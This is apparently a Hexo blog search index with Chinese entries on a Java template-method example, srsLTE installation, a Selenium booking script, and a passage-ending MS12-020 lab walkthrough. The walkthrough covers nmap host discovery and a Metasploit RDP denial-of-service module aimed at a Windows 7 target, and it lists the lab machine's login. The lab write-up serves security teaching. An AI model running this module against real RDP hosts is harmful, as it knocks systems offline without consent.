<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>java设计模式学习笔记——模板方法模式</title>
      <link href="/2019/02/20/%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/02/20/%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="模板方法模式"><a href="#模板方法模式" class="headerlink" title="模板方法模式"></a>模板方法模式</h3><p> 在一个方法中定义一个算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以在不改变算法的结构下，重新定义算法中的某些步骤。<br> <a id="more"></a></p><h3 id="代码demo"><a href="#代码demo" class="headerlink" title="代码demo"></a>代码demo</h3><p>国外人部分人的生活习惯和国内大部分人不同，举例早上起床。电影中常看到国外人起床一般都是先洗澡，然后再洗漱吃早餐。<br>程序代码如下：</p><ol><li>模板抽象类   </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> designPattern.TemplateMethod;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Mouri on 2019/2/20 16:59</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">WakeUpTemplate</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            leaveBed();</span><br><span class="line">            <span class="keyword">if</span>(IsTakeBath())&#123;</span><br><span class="line">                takeBath();</span><br><span class="line">            &#125;</span><br><span class="line">            brushTooth();</span><br><span class="line">            washFace();</span><br><span class="line">            eatBrakefast();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">leaveBed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"leave the bed first!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">takeBath</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"foreigner always take bathes first"</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">IsTakeBath</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">brushTooth</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"brush our tooth"</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">washFace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"wash your face!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eatBrakefast</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>国内人起床的实现</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> designPattern.TemplateMethod;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Mouri on 2019/2/20 17:20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Chinese</span> <span class="keyword">extends</span> <span class="title">WakeUpTemplate</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">eatBrakefast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Chinese likes soybean milk and congee"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>国外人的起床实现   </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> designPattern.TemplateMethod;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Mouri on 2019/2/20 17:23</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">American</span> <span class="keyword">extends</span> <span class="title">WakeUpTemplate</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">eatBrakefast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"American like milk and bread"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">IsTakeBath</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>测试   </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> designPattern.TemplateMethod;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by Mouri on 2019/2/20 17:25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        WakeUpTemplate wakeUpByChinese = <span class="keyword">new</span> Chinese();</span><br><span class="line">        WakeUpTemplate wakeUpByAmerican = <span class="keyword">new</span> American();</span><br><span class="line">        wakeUpByChinese.wakeup();</span><br><span class="line">        System.out.println(<span class="string">"==============================="</span>);</span><br><span class="line">        wakeUpByAmerican.wakeup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">leave the bed first!</span><br><span class="line">brush our tooth</span><br><span class="line">wash your face!</span><br><span class="line">Chinese likes soybean milk and congee</span><br><span class="line">===============================</span><br><span class="line">leave the bed first!</span><br><span class="line">foreigner always take bathes first</span><br><span class="line">brush our tooth</span><br><span class="line">wash your face!</span><br><span class="line">American like milk and bread</span><br></pre></td></tr></table></figure></p><p>通过子类的继承实现了不同的父类的步骤流程的细节，提高代码的复用。如果某步骤的执行需要判断条件，则可以在父类的模板方法中引入判断语句，如果子类需要实现该方法。则重写父类方法，将判断的值进行修改。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li>子类在实现详细的处理流程时，不会打乱复杂的步骤的执行程序。</li><li>通过恰当的继承实现代码的复用。</li><li>可通过子类来覆盖父类的基本方法，更换和增加子类很方便，符合单一职责和开闭原则。</li></ol><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li>如果父类中的可变方法较多，则系统会变得庞大。此时可以结合桥接的模式进行设计（暂时没有学习）</li></ol><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><ol><li>对一个算法或者流程中进行分析，将其中不变的部分设计成模板方法和父类具体方法，并将可变部分交给子类来实现。</li><li>子类的公共行为应被集中到公共父类避免代码重复。</li><li>需要通过子类来决定父类算法某个步骤的具体行为。</li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>srsLTE安装</title>
      <link href="/2019/01/28/srsLTE%E5%AE%89%E8%A3%85/"/>
      <url>/2019/01/28/srsLTE%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>介绍srsLTE的安装配置，方便实验环境快速搭建。<br><a id="more"></a></p><h3 id="更改apt源，安装必要工具"><a href="#更改apt源，安装必要工具" class="headerlink" title="更改apt源，安装必要工具"></a>更改apt源，安装必要工具</h3><ol><li>备份源文件<br><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></li><li>安装vim<br><code>sudo apt install vim</code></li><li>编辑源文件<br><code>sudo vim /etc/apt/sources.list</code></li><li><p>注释所有内容，并加入以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure></li><li><p>更新软件包及列表<br><code>sudo apt update</code><br><code>sudo apt upgrade</code></p></li><li>安装git<br><code>sudo apt install git</code></li><li>安装requests<br><code>sudo apt install python-pip</code><br><code>pip install requests</code></li></ol><h3 id="UHD安装"><a href="#UHD安装" class="headerlink" title="UHD安装"></a>UHD安装</h3><ol><li><p>下载驱动的源码并切换到稳定的版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/EttusResearch/uhd</span><br><span class="line">cd uhd</span><br><span class="line">git checkout release_003_010_000_000</span><br></pre></td></tr></table></figure></li><li><p>安装依赖<br><code>sudo apt-get install libboost-all-dev libusb-1.0-0-dev python-cheetah doxygen python-docutils g++ cmake python-setuptools python-mako</code></p></li><li>编译   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd uhd/host/   </span><br><span class="line">mkdir build   </span><br><span class="line">cd build   </span><br><span class="line">cmake ../   </span><br><span class="line">make -j2   </span><br><span class="line">make test   </span><br><span class="line">sudo make install   </span><br><span class="line">sudo ldconfig    //更新动态链接库</span><br></pre></td></tr></table></figure></li></ol><h3 id="srsLTE依赖库安装"><a href="#srsLTE依赖库安装" class="headerlink" title="srsLTE依赖库安装"></a>srsLTE依赖库安装</h3><ol><li>依赖（Ubuntu 17.04及以上）<br><code>sudo apt-get install cmake libfftw3-dev libmbedtls-dev libboost-program-options-dev libboost-thread-dev libconfig++-dev libsctp-dev</code><h4 id="srsGUI库安装"><a href="#srsGUI库安装" class="headerlink" title="srsGUI库安装"></a>srsGUI库安装</h4><ol><li>依赖<br><code>sudo apt-get install libboost-system-dev libboost-test-dev libboost-thread-dev libqwt-dev libqt4-dev</code></li><li>下载及安装命令   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/suttonpd/srsgui.git   </span><br><span class="line">    cd srsGUI   </span><br><span class="line">    mkdir build   </span><br><span class="line">    cd build</span><br><span class="line">    cmake ../</span><br><span class="line">    make</span><br><span class="line">    sudo make install</span><br><span class="line">    sudo ldconfig</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="srsLTE编译运行"><a href="#srsLTE编译运行" class="headerlink" title="srsLTE编译运行"></a>srsLTE编译运行</h3><ol><li>下载及编译<pre><code>git clone https://github.com/srsLTE/srsLTEcd srsLTEmkdir buildcd buildcmake ../make -j2make testsudo make installsudo ldconfig</code></pre></li><li>srsLTE模块运行<br>在srsLTE文件夹下分别有srsepc,srsenb,srsue三个子文件夹。分别进入文件夹后备份配置文件并修改后缀名称并运行，以srsue为例。<br><code>cd srsue</code><br><code>cp ue.conf.example ue.conf</code><br><code>sudo srsue ue.conf</code>   </li></ol><p>暂时没有硬件，配置文件修改部分以后添加。<br>为了方便阅读源码，安装codeblocks<br><code>sudo pip install codeblocks</code></p>]]></content>
      
      
      <categories>
          
          <category> SDR </category>
          
      </categories>
      
      
        <tags>
            
            <tag> srsLTE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>selenium工具学习</title>
      <link href="/2019/01/13/selenium%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/01/13/selenium%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="如何了解selenium"><a href="#如何了解selenium" class="headerlink" title="如何了解selenium"></a>如何了解selenium</h3><p>&emsp;&emsp;最近女朋友的导师实验室发现了一个叫做TimeTree的网站，让他的学生每天23:00（原来是24:00）登录网页预约实验仪器。我帮抢过几次，非常不方便，快到十一点的时候就要守在电脑旁边。就准备写个定时任务的脚本，帮我提交。<br>&emsp;&emsp;刚开始想通过requests的方法将预约的时间和日期提交请求，但是发现在request header里面含有CSRF-token。了实验室同学，同学推荐使用selenium工具。</p><a id="more"></a><h3 id="selenium简介"><a href="#selenium简介" class="headerlink" title="selenium简介"></a>selenium简介</h3><p>&emsp;&emsp;Selenium是一个用于Web应用程序测试的工具。Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Mozilla Firefox，Safari，Google Chrome，Opera等。这个工具的主要功能包括：测试与浏览器的兼容性——测试你的应用程序看是否能够很好得工作在不同浏览器和操作系统之上。测试系统功能——创建回归测试检验软件功能和用户需求。支持自动录制动作和自动生成 .Net、Java、Perl等不同语言的测试脚本。<a href="https://baike.baidu.com/item/selenium/18266" target="_blank" rel="noopener">https://baike.baidu.com/item/selenium/18266</a></p><h3 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h3><ol><li>pip安装<br><code>pip install selenium</code></li><li>下载驱动<br><a href="http://chromedriver.storage.googleapis.com/index.html" target="_blank" rel="noopener">谷歌驱动链接</a></li><li>下载解压后，将chromedriver.exe,移动到Python的安装目录。然后再将Python的安装目录添加到系统环境变量的Path下面。</li></ol><h3 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.action_chains import ActionChains</span><br><span class="line">from selenium.webdriver.support.ui import WebDriverWait</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">from selenium.webdriver.support.ui import WebDriverWait</span><br><span class="line">from selenium.webdriver.support import expected_conditions as EC</span><br><span class="line">from datetime import datetime, timedelta</span><br><span class="line">from time import sleep</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">EMAIL = &quot;abc@qq.com&quot;</span><br><span class="line">PASSWORD = &quot;123&quot;</span><br><span class="line"></span><br><span class="line">#时间将24小时制乘以2对应。</span><br><span class="line">#例如</span><br><span class="line">#12:00——24；13:30——27</span><br><span class="line">startTime = 25</span><br><span class="line">endTime = 35</span><br><span class="line">#日期</span><br><span class="line">#Day是抢的日期在本月日历（5*7或者4*7的矩阵）排第几，例如在2019年一月的日历中含有12.31一天，则1.1号就记作2。</span><br><span class="line">Day = 17</span><br><span class="line">EventTitle = &quot;CQQ&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SECONDS_PER_DAY = 24 * 60 * 60</span><br><span class="line"></span><br><span class="line">def doLogin():</span><br><span class="line">    browser = webdriver.Chrome()</span><br><span class="line">    browser.get(&apos;https://timetreeapp.com/signin&apos;)</span><br><span class="line">    #登录</span><br><span class="line">    browser.find_element_by_xpath(&quot;//input[@placeholder=&apos;邮箱地址&apos;]&quot;).send_keys(EMAIL)</span><br><span class="line">    browser.find_element_by_xpath(&quot;//input[@placeholder=&apos;8~32 个字符的密码&apos;]&quot;).send_keys(PASSWORD)</span><br><span class="line">    browser.find_element_by_xpath(&quot;//input[@value=&apos;登陆&apos;]&quot;).click()</span><br><span class="line"></span><br><span class="line">    #选择日期</span><br><span class="line">    element = WebDriverWait(browser,30).until(EC.presence_of_element_located(</span><br><span class="line">        (By.XPATH,&apos;//*[@id=&quot;root&quot;]/div/div/div[1]/div[2]/div/div/div/div[1]/div[3]/div/div[1]/div[2]/div[3]/div[2]/div[3]&apos;)))</span><br><span class="line">    # day = browser.find_element_by_xpath(&apos;//*[@id=&quot;root&quot;]/div/div/div[1]/div[2]/div/div/div/div[1]/div[3]/div/div[1]/div[2]/div[3]/div[2]/div[3]&apos;)</span><br><span class="line">    day = browser.find_elements_by_class_name(&apos;dayCell&apos;)[Day-1]</span><br><span class="line">    # 双击不知道为啥不行</span><br><span class="line">    # ActionChains(browser).double_click(day).perform()</span><br><span class="line">    day.click()</span><br><span class="line">    day.click()</span><br><span class="line">    browser.find_element_by_css_selector(&quot;.more.clickable&quot;).click()</span><br><span class="line"></span><br><span class="line">    #取消全天</span><br><span class="line">    wholeDay = browser.find_elements_by_class_name(&quot;inner&quot;)[0]</span><br><span class="line">    wholeDay.click()</span><br><span class="line"></span><br><span class="line">    #EventTitle</span><br><span class="line">    eventTitle = browser.find_element_by_xpath(&apos;//*[@id=&quot;root&quot;]/div/div/div[1]/div[2]/div/div/div/div[1]/div[3]/div/div[2]/div[2]/span/div/div/div/div[3]/textarea&apos;)</span><br><span class="line">    eventTitle.send_keys(EventTitle)</span><br><span class="line">    #开始时间</span><br><span class="line">    browser.find_elements_by_class_name(&quot;bottomButton&quot;)[0].click()</span><br><span class="line">    # browser.find_element_by_xpath(&apos;//*[@id=&quot;root&quot;]/div/div/div[1]/div[2]/div/div/div/div[1]/div[3]/div/div[2]/div[2]/span/div/div/div/div[4]/div[1]/span/div/div/div[2]/a[33]&apos;).click()</span><br><span class="line">    browser.find_elements_by_css_selector(&quot;.clickable.row&quot;)[startTime].click()</span><br><span class="line"></span><br><span class="line">    time.sleep(0.5)</span><br><span class="line">    #结束时间</span><br><span class="line">    browser.find_elements_by_class_name(&quot;bottomButton&quot;)[1].click()</span><br><span class="line">    # browser.find_element_by_xpath(&apos;//*[@id=&quot;root&quot;]/div/div/div[1]/div[2]/div/div/div/div[1]/div[3]/div/div[2]/div[2]/span/div/div/div/div[4]/div[2]/span/div/div/div[2]/a[41]&apos;).click()</span><br><span class="line">    browser.find_elements_by_css_selector(&quot;.clickable.row&quot;)[endTime].click()</span><br><span class="line"></span><br><span class="line">    curTime = datetime.now()</span><br><span class="line">    print(&quot;当前时间:%s&quot; % curTime)</span><br><span class="line">    desTime = curTime.replace(hour=23, minute=0, second=0, microsecond=0)</span><br><span class="line">    print(&quot;抢AkTa时间:%s&quot; % desTime)</span><br><span class="line">    leftTime = desTime - curTime</span><br><span class="line"></span><br><span class="line">    sleepSecondSave = leftTime.total_seconds()</span><br><span class="line">    time.sleep(sleepSecondSave)</span><br><span class="line"></span><br><span class="line">    finnalSave = browser.find_elements_by_class_name(&quot;withChildren&quot;)[2]</span><br><span class="line">    finnalSave.click()</span><br><span class="line"></span><br><span class="line">    time.sleep(60)</span><br><span class="line">    browser.close()</span><br><span class="line">    print (&quot;今天已经抢了&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def doFirst():</span><br><span class="line"></span><br><span class="line">    curTime = datetime.now()</span><br><span class="line">    print(&quot;当前时间:%s&quot; % curTime)</span><br><span class="line">    loginTime = curTime.replace(hour=22, minute=58, second=0, microsecond=0)</span><br><span class="line">    print(&quot;登录时间:%s&quot; % loginTime)</span><br><span class="line"></span><br><span class="line">    delta = loginTime - curTime</span><br><span class="line">    print(delta)</span><br><span class="line"></span><br><span class="line">    sleepSecondLogin = delta.total_seconds()</span><br><span class="line">    time.sleep(sleepSecondLogin)</span><br><span class="line">    doLogin()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    doFirst()</span><br></pre></td></tr></table></figure><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>1.<a href="https://blog.csdn.net/huilan_same/article/details/51896672" target="_blank" rel="noopener">chromedriver与chrome版本映射表</a><br>2.<a href="https://selenium-python.readthedocs.io/" target="_blank" rel="noopener">selenium-python中文文档</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ms12-020渗透攻击实战</title>
      <link href="/2018/12/26/ms12-020%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/"/>
      <url>/2018/12/26/ms12-020%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ol><li>攻击机<ol><li>操作系统：kali</li><li>IP地址：172.0.0.10</li></ol></li><li>靶机<ol><li>操作系统：win7</li><li>IP地址：172.0.0.12</li><li>端口开放：3389<a id="more"></a><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3></li></ol></li><li>确保两台主机在局域网内相互ping通</li><li>靶机检查自己开放端口，确保3389端口开放。</li></ol><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h4><h5 id="一、-两台主机在局域网内网络互通"><a href="#一、-两台主机在局域网内网络互通" class="headerlink" title="一、 两台主机在局域网内网络互通"></a>一、 两台主机在局域网内网络互通</h5><ol><li>登录攻击机<br>账号：<code>debian</code><br>密码：<code>kalidebian</code></li><li>右键选择-&gt;<code>Open Terminal Here</code>打开命令行终端</li><li>输入<code>ip address</code>确认自己的IP地址<br><img src="/2018/12/26/ms12-020渗透攻击实战/ipaddress.png" alt="Alt text"><br>可以看到本机的IP地址为172.0.0.10</li><li>使用nmap命令扫描局域网内其他主机<br><code>nmap -sP 172.0.0.0-255</code><br><img src="/2018/12/26/ms12-020渗透攻击实战/nmap scanIp.png" alt="Alt text"><br>其中172.0.0.2是dhcp服务，可以看到。除了这两个IP。还扫描到一个IP地址为172.0.0.12的主机，这就是靶机的IP地址。</li><li>如果没有发现其他主机，请确认靶机防火墙已经关闭。<h5 id="二、靶机端口3389端口开放"><a href="#二、靶机端口3389端口开放" class="headerlink" title="二、靶机端口3389端口开放"></a>二、靶机端口3389端口开放</h5></li><li>点击搜索符号，输入Zenmap并打开。</li><li>在target输入靶机的IP地址信息并点击scan。<br><img src="/2018/12/26/ms12-020渗透攻击实战/nmap.png" alt="Alt text"></li></ol><p>可以看到靶机的开放端口信息，其中包含3389端口。如果3389端口没有开放，则需要登录靶机并开启3389端口。</p><h4 id="ms12-020漏洞攻击"><a href="#ms12-020漏洞攻击" class="headerlink" title="ms12-020漏洞攻击"></a>ms12-020漏洞攻击</h4><ol><li>登录攻击机，打开命令行终端</li><li><p>输入命令<code>msfconsole</code>进入MSF终端<br><img src="/2018/12/26/ms12-020渗透攻击实战/msfconsole.png" alt="Alt text"></p></li><li><p>在MSF终端对目标漏洞进行查找相对应的漏洞利用模块<br><code>search ms12-020</code><br><code>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code><br><img src="/2018/12/26/ms12-020渗透攻击实战/use模块.png" alt="Alt text"></p></li><li><p>配置目标主机和本机地址<br><code>set RHOST 172.0.0.12</code><br><code>set LHOST 172.0.0.10</code><br><img src="/2018/12/26/ms12-020渗透攻击实战/setIP.png" alt="Alt text"></p></li><li><p>对目标漏洞执行攻击，输入命令<code>exploit</code><br><img 